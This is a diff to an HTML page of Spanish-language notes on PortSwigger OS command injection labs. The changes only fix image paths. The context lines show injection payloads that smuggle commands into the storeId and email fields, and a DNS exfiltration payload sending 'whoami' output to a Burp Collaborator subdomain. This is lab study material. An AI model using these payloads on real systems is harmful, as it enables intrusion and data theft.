@@ -41,9 +41,9 @@
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 1</span>OS command injection, simple case</h5>
       <p class="text-secondary">Interceptar la consulta del botón <strong>Check stock</strong> con Burp Suite y enviarla al Repeater. Agregar el comando al parámetro <code>storeId</code> usando <code>;</code> como separador.</p>
-      <img src="../img/command1.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command1.1.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code>productId=2&amp;storeId=1 ; id</code></pre>
-      <img src="../img/command1.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command1.2.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <!-- Blind OS command injection -->
@@ -54,7 +54,7 @@
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 2</span>Blind OS command injection with time delays</h5>
       <p class="text-secondary">Interceptar el envío del formulario de feedback. El parámetro vulnerable es <code>email</code>. Usar <code>ping</code> para generar un delay de ~10 segundos.</p>
-      <img src="../img/command3.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command3.1.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato@gmail.com||ping+-c+10+127.0.0.1||&amp;subject=test&amp;message=test</code></pre>
     </section>
 
@@ -73,16 +73,16 @@ https://LAB-ID.web-security-academy.net/image?filename=miau.txt</code></pre>
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 5</span>Blind OS command injection with out-of-band interaction</h5>
       <p class="text-secondary">Usar el <strong>Burp Collaborator Client</strong> para obtener un subdominio. Inyectar un <code>nslookup</code> al dominio del Collaborator para verificar la interacción DNS.</p>
-      <img src="../img/command5.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command5.1.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato%40gmail.com||nslookup+COLLABORATOR-SUBDOMAIN.burpcollaborator.net||&amp;subject=test&amp;message=test</code></pre>
-      <img src="../img/command5.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command5.2.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 6</span>Blind OS command injection with out-of-band data exfiltration</h5>
       <p class="text-secondary">Exfiltrar la salida de un comando como subdominio DNS al Burp Collaborator. Usar backticks para capturar el output de <code>whoami</code> e incluirlo en la consulta DNS.</p>
       <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato%40gmail.com||nslookup+`whoami`.COLLABORATOR-SUBDOMAIN.burpcollaborator.net||&amp;subject=test&amp;message=test</code></pre>
-      <img src="../img/command6.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/command6.1.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
   </main>
